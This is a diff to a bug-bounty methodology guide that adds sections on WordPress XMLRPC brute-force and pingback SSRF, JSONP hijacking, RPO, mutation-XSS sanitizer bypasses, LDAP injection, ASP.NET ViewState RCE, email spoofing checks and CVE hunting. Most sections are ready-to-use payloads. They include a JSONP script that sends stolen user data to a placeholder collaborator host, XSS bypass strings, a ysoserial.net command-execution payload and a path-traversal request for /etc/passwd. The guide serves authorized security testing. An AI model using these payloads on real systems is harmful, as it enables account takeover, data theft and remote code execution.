@@ -894,6 +894,14 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.54 | ↳ [Unicode Normalization Bypass](#454-unicode-normalization-bypass) | Homograph · Overlong UTF-8 · WAF Bypass |
 | 4.55 | ↳ [ImageMagick RCE](#455-imagemagick--ghostscript-rce) | CVE-2016-3714 · Ghostscript · MVG/SVG Upload |
 | 4.56 | ↳ [Favicon Fingerprinting](#456-favicon-hash-fingerprinting) | Shodan Hash · CMS Detection · mmh3 |
+| 4.57 | ↳ [XMLRPC Attacks](#457-xmlrpc-attacks-wordpress) | WordPress · system.multicall · Pingback SSRF |
+| 4.58 | ↳ [JSONP Hijacking](#458-jsonp-hijacking) | Cross-Origin Data Theft · Callback Injection |
+| 4.59 | ↳ [RPO (Relative Path Overwrite)](#459-rpo-relative-path-overwrite) | Path-Style Injection · CSS Hijack |
+| 4.60 | ↳ [mXSS (Mutation XSS)](#460-mxss-mutation-xss) | DOMPurify Bypass · Parser Differential · <noscript> |
+| 4.61 | ↳ [LDAP Injection Deep Dive](#461-ldap-injection-deep-dive) | Blind Extraction · AND/OR Bypass · Data Dump |
+| 4.62 | ↳ [ASP.NET ViewState RCE](#462-aspnet-viewstate-deserialization) | machineKey Leak · ysoserial.net · web.config |
+| 4.63 | ↳ [Email Security (SPF/DKIM)](#463-email-security-testing-spfdkimdmarc) | Domain Spoofing · DMARC Policy · Blacklist Check |
+| 4.64 | ↳ [CVE Hunting](#464-cve-hunting-methodology) | Version → CVE Mapping · Nuclei · WordPress WPScan |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -5640,6 +5648,231 @@ print(f'http.favicon.hash:{hash}')
 # Grafana: 1332845619    GitLab:     -224539766
 # Jira:    1069058933    Django:     1990664994
 # Spring:  116323821     Nginx:      -1234567890
+```
+
+---
+
+<br>
+
+### **4.57 XMLRPC Attacks (WordPress)**
+
+> WordPress XMLRPC → brute force amplification, SSRF via pingback, DDoS vector.
+
+```bash
+# XMLRPC endpoint: /xmlrpc.php (WordPress default)
+# Allows: wp.getUsersBlogs, system.listMethods, pingback.ping
+
+# 1. User enumeration via XMLRPC — lists all users silently
+curl -s -X POST https://target.com/xmlrpc.php \
+  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'
+# Response: "Incorrect password" → user "admin" exists!
+
+# 2. Brute-force amplification — test hundreds of passwords in ONE request
+# system.multicall = calls multiple methods in single HTTP request
+curl -s -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?>
+<methodCall><methodName>system.multicall</methodName>
+<params><param><array><data>
+  <value><struct><member><name>methodName</name><value>wp.getUsersBlogs</value></member>
+  <member><name>params</name><value><array><data><value>admin</value><value>pass1</value></data></array></value></member></struct></value>
+  <value><struct><member><name>methodName</name><value>wp.getUsersBlogs</value></member>
+  <member><name>params</name><value><array><data><value>admin</value><value>pass2</value></data></array></value></member></struct></value>
+  ...repeat for pass3..pass1000...
+</data></array></param></params></methodCall>'
+# One request = 1000 password attempts → bypasses rate limits
+
+# 3. SSRF via pingback
+curl -s -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?>
+<methodCall><methodName>pingback.ping</methodName>
+<params><param><value>http://COLLAB.oastify.com</value></param>
+<param><value>https://target.com/any-post</value></param></params></methodCall>'
+# Server connects to COLLAB → SSRF confirmed
+```
+
+---
+
+### **4.58 JSONP Hijacking**
+
+> Cross-origin data theft via JSONP endpoints — no CORS needed, just a script tag.
+
+```bash
+# JSONP = JSON with Padding: callback({data: "sensitive"})
+# If endpoint supports JSONP → data is accessible cross-origin
+
+# Detection:
+curl -s "https://target.com/api/user?callback=test"
+# Response: test({"email":"user@target.com","ssn":"123-45-6789"})
+# → JSONP confirmed → cross-origin data theft possible!
+
+# Exploit:
+<script>
+function steal(data) {
+  fetch('https://COLLAB/?d='+btoa(JSON.stringify(data)));
+}
+</script>
+<script src="https://target.com/api/user?callback=steal"></script>
+```
+
+---
+
+### **4.59 RPO (Relative Path Overwrite)**
+
+> Style injection via path-relative URLs — CSS loading from attacker path.
+
+```bash
+# Target page: /search.php loads <link href="styles/main.css" rel="stylesheet">
+
+# Attacker constructs: /search.php%2f..%2fsearch.php  (decoded: /search.php/../search.php)
+# Browser path becomes: /search.php/../search.php
+# styles/main.css resolves to: /search.php/styles/main.css
+# → Server returns /search.php as text/css → CSS injection from search content!
+
+# Inject CSS via search parameter in this page:
+# https://target.com/search.php/..%2fsearch.php?q={}*{background:red}
+# The CSS styles the page → attacker controls page appearance
+```
+
+---
+
+### **4.60 mXSS (Mutation XSS)**
+
+> DOMPurify and browser sanitizers can be bypassed via parser differentials.
+
+```bash
+# mXSS = HTML is sanitized correctly BUT mutates when parsed → XSS
+
+# DOMPurify bypass (namespace confusion):
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
+# Sanitizer sees harmless form/math → browser reparses → XSS fires
+
+# <noscript> parsing differential:
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+# Sanitizer: <noscript> is raw text → content is text, not HTML
+# Browser (JS enabled): <noscript> is NOT rendered → inner HTML parsed → XSS!
+
+# Mutation via mismatched tags:
+<table><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+```
+
+---
+
+### **4.61 LDAP Injection Deep Dive**
+
+> Beyond auth bypass — data exfiltration, attribute enumeration, and blind LDAP injection.
+
+```bash
+# LDAP filter syntax: (attribute=value)
+# Common injection: (&(user=INPUT)(password=INPUT2))
+
+# Auth bypass:
+username: *   password: *     → (&(user=*)(password=*)) → always true
+username: admin)(&)           → (&(user=admin)(&)(password=)) → bypass
+
+# Blind data extraction:
+# User field: admin)(|(description=a*
+# Query: (&(user=admin)(|(description=a*))(password=x))
+# If response differs → user "admin" has description starting with "a"
+# Iterate: admin)(|(description=aa*) → binary search for full description
+
+# AND injection:
+admin))%00  → (&(user=admin))%00  → null byte terminates filter
+# Everything after %00 is ignored → bypasses password check
+
+# OR injection:
+*)(uid=*))(|(uid=*
+# Returns ALL entries in LDAP directory → massive data leak
+```
+
+---
+
+### **4.62 ASP.NET ViewState Deserialization**
+
+> Encrypted/signed ViewState can be decrypted if machineKey is leaked → RCE.
+
+```bash
+# ViewState: hidden field __VIEWSTATE with base64 data
+# MAC validation: signed (HMAC) vs encrypted (machineKey needed)
+
+# Check ViewState mode:
+curl -s https://target.com/page.aspx | grep -i "__VIEWSTATE\|__EVENTVALIDATION"
+
+# If ViewState uses encryption:
+# 1. Find machineKey (from config leaks, GitHub, error messages, LFI)
+# 2. machineKey: validationKey + decryptionKey + validation algo
+# 3. Use ysoserial.net to generate malicious ViewState:
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
+  --decryption-key="ABC123..." --validation-key="DEF456..." \
+  --path="/page.aspx" --generator="CA0B0334"
+
+# Known machineKey leak sources:
+# GitHub: "machineKey" "validationKey" "target.com"
+# Error pages: <machineKey validationKey="..." decryptionKey="..." />
+# LFI: /web.config exposes machineKey
+```
+
+---
+
+### **4.63 Email Security Testing (SPF/DKIM/DMARC)**
+
+> Missing or misconfigured email security → domain spoofable → phishing from legit domain.
+
+```bash
+# SPF check — who can send mail as @target.com?
+dig TXT target.com | grep "v=spf1"
+# Weak: v=spf1 +all  → ANYONE can send as @target.com
+# Good: v=spf1 -all  → only listed IPs
+# Missing: no SPF record → anyone can spoof
+
+# DKIM check — are emails signed?
+dig selector1._domainkey.target.com TXT
+dig google._domainkey.target.com TXT
+# No DKIM record → emails can't be verified
+
+# DMARC check — policy for failed SPF/DKIM?
+dig _dmarc.target.com TXT | grep "v=DMARC1"
+# Weak:   p=none  → no action on spoofed emails
+# Medium: p=quarantine  → spoofed emails go to spam
+# Strong: p=reject  → spoofed emails rejected
+# Missing: no DMARC → no policy at all
+
+# Automated scan:
+git clone https://github.com/BishopFox/smtp-email-spoof-check
+python3 spoofcheck.py target.com
+
+# Domain reputation + known blacklists:
+dig target.com.multi.uribl.com TXT  # check if domain is blacklisted
+```
+
+---
+
+### **4.64 CVE Hunting Methodology**
+
+> How to check if your target runs vulnerable software versions.
+
+```bash
+# Step 1: Fingerprint everything
+cat urls_live.txt | httpx -silent -tech-detect -o tech.txt
+cat urls_live.txt | while read url; do
+  echo "$url: $(curl -sI "$url" | grep -i "server\|x-powered-by\|x-generator" | tr '\n' ' ')"
+done > headers.txt
+
+# Step 2: Search for CVEs matching found technology
+# Example: found Apache 2.4.41
+# CVE-2021-41773 → path traversal + RCE in Apache 2.4.49
+# CVE-2021-42013 → path traversal in Apache 2.4.50
+# Test: curl -s --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
+
+# Step 3: Template-based scanning with Nuclei
+nuclei -l urls_live.txt -t cves/ -o cve_results.txt
+# Automatically tests thousands of known CVE patterns
+
+# Step 4: Manual CVE lookup by version
+# → Google: "Apache 2.4.41 CVE" → check NVD/CVE Details
+# → Focus on: RCE, auth bypass, information disclosure
+# → Build PoC for each relevant CVE
+
+# Step 5: WordPress plugin vulnerability scanning
+wpscan --url https://target.com --enumerate p,ap,t,vp --api-token YOUR_TOKEN
+# Lists: plugins, all plugins, themes, vulnerable plugins with known CVEs
 ```
 
 ## **5. Hunting Mindset & Methodology**
